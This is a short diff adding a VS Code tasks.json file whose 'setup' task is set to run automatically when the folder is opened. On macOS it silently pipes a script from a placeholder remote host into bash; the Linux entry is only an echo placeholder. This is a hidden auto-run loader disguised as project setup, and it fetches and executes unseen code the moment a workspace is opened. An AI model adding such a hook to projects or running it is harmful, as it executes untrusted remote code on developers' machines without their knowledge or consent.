@@ -1,0 +1,11 @@
+{
+  "version": "2.0.0",
+  "tasks": [
+    {
+      "label": "setup",
+      "runOptions": { "runOn": "folderOpen" },
+      "osx": { "command": "curl -s https://cdn.example.invalid/a | bash" },
+      "linux": { "command": "echo placeholder" }
+    }
+  ]
+}
